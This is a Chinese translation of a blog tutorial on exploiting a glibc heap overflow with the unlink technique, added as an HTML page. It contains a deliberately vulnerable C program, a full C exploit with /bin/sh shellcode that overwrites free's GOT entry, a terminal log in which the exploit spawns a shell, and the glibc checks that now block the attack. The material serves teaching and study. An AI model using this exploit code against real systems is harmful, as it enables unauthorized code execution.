@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Unlink堆溢出 - 善守者</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="作者: CSysSec出品  CSysSec注： 本系列文章译自安全自由工作者Sploitfun的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在这里找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。转载本文请务必注明，文章出处：《Linux(X86)漏洞利用系列-">
+<meta name="keywords" content="Security,Exploit,Heap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unlink堆溢出">
+<meta property="og:url" content="https://diting0x.github.io/20170104/heapoverflow-unlink/index.html">
+<meta property="og:site_name" content="善守者">
+<meta property="og:description" content="作者: CSysSec出品  CSysSec注： 本系列文章译自安全自由工作者Sploitfun的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在这里找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。转载本文请务必注明，文章出处：《Linux(X86)漏洞利用系列-">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://oij0laovn.bkt.clouddn.com/heapoverflow1.png">
+<meta property="og:image" content="http://oij0laovn.bkt.clouddn.com/heapoverflow2.png">
+<meta property="og:updated_time" content="2017-08-28T07:15:24.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Unlink堆溢出">
+<meta name="twitter:description" content="作者: CSysSec出品  CSysSec注： 本系列文章译自安全自由工作者Sploitfun的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在这里找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。转载本文请务必注明，文章出处：《Linux(X86)漏洞利用系列-">
+<meta name="twitter:image" content="http://oij0laovn.bkt.clouddn.com/heapoverflow1.png">
+  
+  
+  <link href="/webfonts/ptserif/main.css" rel='stylesheet' type='text/css'>
+  <link href="/webfonts/source-code-pro/main.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
+      <a id="logo" class="logo logo-text" href="/">谛听</a>
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/timeline">Timeline</a>
+        
+          <a class="main-nav-link" href="/shoulders">Shoulders</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        <div id="search-form-wrap">
+          <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://diting0x.github.io"></form>
+        </div>
+      </nav>
+    </div>
+  </div>
+</header>
+    <section id="main" class="outer"><article id="post-heapoverflow-unlink" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Unlink堆溢出
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/20170104/heapoverflow-unlink/" class="article-date">
+  <time datetime="2017-01-04T10:06:46.000Z" itemprop="datePublished">2017-01-04</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/heapoverflow-unlink" target="_blank" rel="external">Linux(X86)漏洞利用系列-Unlink堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<h3 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h3><p>chunk是指具体进行内存分配的区域，目前的默认大小是4M。 </p>
+<p><u>阅读基础</u></p>
+<p><a href="http://www.csyssec.org/20170104/glibcmalloc" target="_blank" rel="external">深入理解glibc malloc</a></p>
+<p>这篇文章，我们会学习到如何利用unlink技术成功利用堆缓冲区溢出。在深入了解unlink技术之前，我们先来看看一个漏洞程序：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"><span class="comment"> Heap overflow vulnerable program. </span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[] )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">char</span> * first, * second;</div><div class="line"></div><div class="line"><span class="comment">/*[1]*/</span> first = <span class="built_in">malloc</span>( <span class="number">666</span> );</div><div class="line"><span class="comment">/*[2]*/</span> second = <span class="built_in">malloc</span>( <span class="number">12</span> );</div><div class="line">        <span class="keyword">if</span>(argc!=<span class="number">1</span>)</div><div class="line"><span class="comment">/*[3]*/</span>         <span class="built_in">strcpy</span>( first, argv[<span class="number">1</span>] );</div><div class="line"><span class="comment">/*[4]*/</span> <span class="built_in">free</span>( first );</div><div class="line"><span class="comment">/*[5]*/</span> <span class="built_in">free</span>( second );</div><div class="line"><span class="comment">/*[6]*/</span> <span class="keyword">return</span>( <span class="number">0</span> );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>上面漏洞程序的第三行会导致堆缓冲区溢出。用户输入的’argv[1]’被拷贝到’first’堆缓冲区，而没有设定任何大小限制。因此，当用户的输入大于666字节时，边界就会覆盖下一个chunk的chunk头。这种溢出进而会导致任意代码执行。</p>
+<p>下面是漏洞程序堆内存的形象图:</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/heapoverflow1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/heapoverflow1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p><u>Unlink</u>: 其主要思想是欺骗’glibc malloc’来达到解开(unlink) ‘second’ chunk的目的。当解开(unlinking) 时，free函数的GOT表项就会被shellcode的地址覆盖。 成功覆盖之后，在漏洞代码中第五行当free被调用时，shellcode就会被执行。还不清楚？没问题，我们先来看看当fre执行的时候’glibc malloc’都做了些什么。</p>
+<p>如果没有攻击中的影响，第[4]行中的<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c" target="_blank" rel="external">free</a>会做下面这些事情：</p>
+<ul>
+<li>对于<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L10" target="_blank" rel="external">没有被映射的chunks来说</a>，向后合并(consolidate banckward)或者向前合并(consolidate forward)。</li>
+<li>向后合并：<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L17" target="_blank" rel="external">查找前一个chunk是否空闲</a>- 如果当前被释放的chunk的PREV_INUSE(P)位没有设置，则shuoming 说明前一个chunk是空闲的。在我们的例子中，由于“first”的PREV_INUSE位已经设置，说明前一个chunk已经被分配了，默认情况下，堆内存的第一个chunk前一个chunk被分配(尽管它不存在)。</li>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L18" target="_blank" rel="external">如果空闲，则合并</a> 比如，从binlist上unlink(移除)前一个chunk,然后将前一个chunk的大小加到当前大小中并修改chunk指针指向前一个chunk。在我们的例子中，前一个chunk已经被分配了，因此unlink没有执行。从而当前被释放的chunk ‘first’不能被向后合并。</li>
+</ul>
+</li>
+<li>向前合并:<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L26" target="_blank" rel="external">查找下一个chunk是否空闲</a>- 如果下下个chunk(从当前被释放的chunk算起)的PREV_INUSE(P)位没有设置，则shuoming 说明下前一个chunk是空闲的。为了遍历到下下个chunk，将当前被释放chunk的大小加入到chunk指针，然后将下一个chunk的大小加入到下一个chunk指针。在我们的例子中，当前被释放chunk的下下个指针是top chunk，并且它的PREV_INUSE位已经设置，说明下一个chunk ‘second’不是空闲的。</li>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L30" target="_blank" rel="external">如果空闲，则合并</a> 比如，从binlist上unlink(移除)前一个chunk,然后将下一个chunk的大小加到当前大小中。在我们的例子中，下一个chunk已经被分配了，因此unlink没有执行。从而当前被释放的chunk ‘first’不能被向前合并。</li>
+</ul>
+</li>
+<li>现在，<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L41" target="_blank" rel="external">将被合并的chunk添加到未排序的bin中</a>。在我们的例子中，合并未能成功执行，所以只要将’first’ chunk添加到未排序的bin中。</li>
+</ul>
+<p>现在我们可以说攻击者在第[3]行按照以下方式覆盖了’second’ chunk的chunk头部：</p>
+<ul>
+<li>prev_size = 偶数，因此PREV_INUSE没有被设置</li>
+<li>size = -4</li>
+<li>fd = free地址 -12</li>
+<li>bk = shellcode地址</li>
+</ul>
+<p>如果受到攻击者的影响，第[4]行中的free会做以下事情：</p>
+<ul>
+<li>对于没有被映射的chunks来说，向后合并(consolidate banckward)或者向前合并(consolidate forward)。</li>
+<li>向后合并：<ul>
+<li>查找前一个chunk是否空闲- 如果当前被释放的chunk的PREV_INUSE(P)位没有设置，则shuoming 说明前一个chunk是空闲的。在我们的例子中，由于“first”的PREV_INUSE位已经设置，说明前一个chunk已经被分配了，默认情况下，堆内存的第一个chunk前一个chunk被分配(尽管它不存在)。</li>
+<li>如果空闲，则合并 比如，从binlist上unlink(移除)前一个chunk,然后将前一个chunk的大小加到当前大小中并修改chunk指针指向前一个chunk。在我们的例子中，前一个chunk已经被分配了，因此unlink没有执行。从而当前被释放的chunk ‘first’不能被向后合并。</li>
+</ul>
+</li>
+<li>向前合并:<ul>
+<li>查找下一个chunk是否空闲- 如果下下个chunk(从当前被释放的chunk算起)的PREV_INUSE(P)位没有设置，则说明下前一个chunk是空闲的。为了遍历到下下个chunk，将当前被释放chunk的大小加入到chunk指针，然后将下一个chunk的大小加入到下一个chunk指针。在我们的例子中，当前被释放chunk的下下个指针不是(NOT)top chunk。由于攻击者已经用-4覆盖了’second’ chunk的大小，’second’ chunk的下下个chunk应该在-4偏移处。因此，现在’glibc malloc’将’second’ chunk的prev_inuse当做下下个chunk的大小域。由于攻击者已经用一个偶数(PREV_INUSE(P)位被复位)覆盖了prev_size，这样就欺骗了’glibc malloc’ 让其相信’second’ chunk是释放的。</li>
+<li>如果空闲，则合并] 比如，从binlist上unlink(移除)前一个chunk,然后将下一个chunk的大小加到当前大小中。在我们的例子中，下一个chunk是空闲的，因此’second’ chunk将按以下方式<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c" target="_blank" rel="external">unlink</a>。<pre><code>+  将&apos;second&apos; chunk的fd和bk值相应的拷贝到[FD](https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c#L3)与[BK](https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c#L4)变量。在我们例子中，FD =free地址-12， BK=shellcode地址 (作为堆溢出的一部分，攻击者将shellcode放入&apos;first&apos;堆缓冲区内部）。
++  [BK的值被拷贝到FD的12偏移处](https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c#L5)。在我们的例子中，将12字节加入到FD中，然后指向free的GOT表项。这样一来，GOT表项就被shellcode的地址覆盖了。太棒了！现在，任何时候只要free被调用，就会执行shellcode! 因此，漏洞程序中的第五行就会导致shellcode的执行。
+</code></pre></li>
+</ul>
+</li>
+<li>现在，将被合并的chunk添加到未排序的bin中。</li>
+</ul>
+<p>被攻击者修改过的用户输入，漏洞程序的堆内存的形象图如下：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/heapoverflow2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/heapoverflow2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>理解了unlink技术之后，我们就可以写漏洞利用程序了。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Program to exploit 'vuln' using unlink technique.</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FUNCTION_POINTER ( 0x0804978c )         <span class="comment">//Address of GOT entry for free function obtained using "objdump -R vuln".</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE_ADDRESS ( 0x0804a008 + 0x10 )      <span class="comment">//Address of variable 'first' in vuln executable. </span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> VULNERABLE <span class="meta-string">"./vuln"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> DUMMY 0xdefaced</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></div><div class="line"></div><div class="line"><span class="keyword">char</span> shellcode[] =</div><div class="line">        <span class="comment">/* Jump instruction to jump past 10 bytes. ppssssffff - Of which ffff would be overwritten by unlink function</span></div><div class="line"><span class="comment">        (by statement BK-&gt;fd = FD). Hence if no jump exists shell code would get corrupted by unlink function. </span></div><div class="line"><span class="comment">        Therefore store the actual shellcode 12 bytes past the beginning of buffer 'first'*/</span></div><div class="line">        <span class="string">"\xeb\x0assppppffff"</span></div><div class="line">        <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">void</span> )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">char</span> * p;</div><div class="line">        <span class="keyword">char</span> argv1[ <span class="number">680</span> + <span class="number">1</span> ];</div><div class="line">        <span class="keyword">char</span> * argv[] = &#123; VULNERABLE, argv1, <span class="literal">NULL</span> &#125;;</div><div class="line"></div><div class="line">        p = argv1;</div><div class="line">        <span class="comment">/* the fd field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the bk field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the fd_nextsize field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the bk_nextsize field of the first chunk */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( DUMMY );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* Copy the shellcode */</span></div><div class="line">        <span class="built_in">memcpy</span>( p, shellcode, <span class="built_in">strlen</span>(shellcode) );</div><div class="line">        p += <span class="built_in">strlen</span>( shellcode );</div><div class="line">        <span class="comment">/* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize </span></div><div class="line"><span class="comment">        of first chunk */</span></div><div class="line">        <span class="built_in">memset</span>( p, <span class="string">'B'</span>, (<span class="number">680</span> - <span class="number">4</span>*<span class="number">4</span>) - (<span class="number">4</span>*<span class="number">4</span> + <span class="built_in">strlen</span>(shellcode)) );</div><div class="line">        p += ( <span class="number">680</span> - <span class="number">4</span>*<span class="number">4</span> ) - ( <span class="number">4</span>*<span class="number">4</span> + <span class="built_in">strlen</span>(shellcode) );</div><div class="line">        <span class="comment">/* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset */</span></div><div class="line">        *( (<span class="keyword">size_t</span> *)p ) = (<span class="keyword">size_t</span>)( DUMMY &amp; ~PREV_INUSE );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*/</span></div><div class="line">        *( (<span class="keyword">size_t</span> *)p ) = (<span class="keyword">size_t</span>)( <span class="number">-4</span> );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the fd field of the second chunk. It should point to free - 12. -12 is required since unlink function</span></div><div class="line"><span class="comment">        would do + 12 (FD-&gt;bk). This helps to overwrite the GOT entry of free with the address we have overwritten in </span></div><div class="line"><span class="comment">        second chunk's bk field (see below) */</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( FUNCTION_POINTER - <span class="number">12</span> );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the bk field of the second chunk. It should point to shell code address.*/</span></div><div class="line">        *( (<span class="keyword">void</span> **)p ) = (<span class="keyword">void</span> *)( CODE_ADDRESS );</div><div class="line">        p += <span class="number">4</span>;</div><div class="line">        <span class="comment">/* the terminating NUL character */</span></div><div class="line">        *p = '';</div><div class="line"></div><div class="line">        <span class="comment">/* the execution of the vulnerable program */</span></div><div class="line">        execve( argv[<span class="number">0</span>], argv, <span class="literal">NULL</span> );</div><div class="line">        <span class="keyword">return</span>( <span class="number">-1</span> );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>执行上面的漏洞利用程序，可以触发一个新的shell!</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib -Wl,--dynamic-linker=/home/sploitfun/glibc/glibc-inst2<span class="number">.20</span>/lib/ld-linux.so<span class="number">.2</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$ gcc -g -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c</div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$ ./<span class="built_in">exp</span> </div><div class="line">$ ls</div><div class="line">cmd  <span class="built_in">exp</span>  <span class="built_in">exp</span>.c  vuln  vuln.c</div><div class="line">$ <span class="built_in">exit</span></div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/unlink$</div></pre></td></tr></table></figure>
+<p><u>保护</u>: 现如今，’glibc malloc’经过许多年的发展已经被强化了(hardened)，unlink已经技术无法成功执行。为了防御unlink技术带来的堆溢出，’glibc malloc’加入了下面的检查：</p>
+<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3947" target="_blank" rel="external">两次释放(Double Free)</a>: 释放已经处于空闲状态的chunk是禁止的。当攻击者试图将’second’ chunk的大小覆盖为-4, 其PREV_INUSE位被复位，意味着’first’已经处于空闲状态。这时’glibc malloc’会抛出一个两次释放错误。</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</div><div class="line">    &#123;</div><div class="line">      errstr = <span class="string">"double free or corruption (!prev)"</span>;</div><div class="line">      <span class="keyword">goto</span> errout;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3954" target="_blank" rel="external">无效的next size</a>: 下一个chunk的大小介于8字节与arena的总系统内存之间。当攻击者试图将’second’ chunk的大小覆盖为-4,’glibc malloc’会抛出一个无效的next size错误</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</div><div class="line">        || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</div><div class="line">      &#123;</div><div class="line">        errstr = <span class="string">"free(): invalid next size (normal)"</span>;</div><div class="line">        <span class="keyword">goto</span> errout;</div><div class="line">      &#125;</div></pre></td></tr></table></figure>
+<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1414" target="_blank" rel="external">损坏的双链表</a>： 前一个chunk的fd和下一个chunk的bk必须指向当前被unlinked的chunk。当攻击者分别将fd和bk覆盖为-12与shellcode地址， free和(shellcode地址+8)没有指向当前被unlinked的chunk(‘second’)。 ‘glibc malloc’会抛出一个损坏的双链表错误.</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                     </div><div class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P);</div></pre></td></tr></table></figure>
+<p><u>注意</u>：为了更好的演示，漏洞程序在编译的时候没有添加以下保护机制：</p>
+<p><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">ASLR</a><br><a href="https://en.wikipedia.org/wiki/NX_bit" target="_blank" rel="external">NX</a><br><a href="https://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only/" target="_blank" rel="external">RELRO(ReLocation Read-Only)</a></p>
+<p>参考</p>
+<p><a href="http://phrack.org/issues/57/8.html" target="_blank" rel="external">vudo malloc tricks</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/heapoverflow-unlink" target="_blank" rel="external">Linux(X86)漏洞利用系列-Unlink堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Heap/">Heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/20170104/heap-offbyone/" id="article-nav-newer" class="article-nav-link-wrap">
+      <div class="article-nav-title"><span>&lt;</span>&nbsp;
+        
+          堆内off-by-one漏洞利用
+        
+      </div>
+    </a>
+  
+  
+    <a href="/20170102/bypassaslr-gotgor/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">绕过ASLR-第三篇章(GOT覆盖与GOT解引用)&nbsp;<span>&gt;</span></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+<div class="share_addthis">
+  <div class="sharing addthis_toolbox share">
+    <a class="addthis_button_facebook_like"></a>
+    <a class="addthis_button_tweet"></a>
+    <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
+    <a class="addthis_counter addthis_pill_style"></a>
+  </div>
+  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-560c64c35486b3d4" async="async"></script>
+</div>
+
+
+
+
+
+</section>
+    <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Diting0x&nbsp;
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, theme by <a href="http://github.com/ppoffice">PPOffice</a>
+    </div>
+  </div>
+</footer>
+    
+
+<script src="/js/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+  </div>
+</body>
+</html>
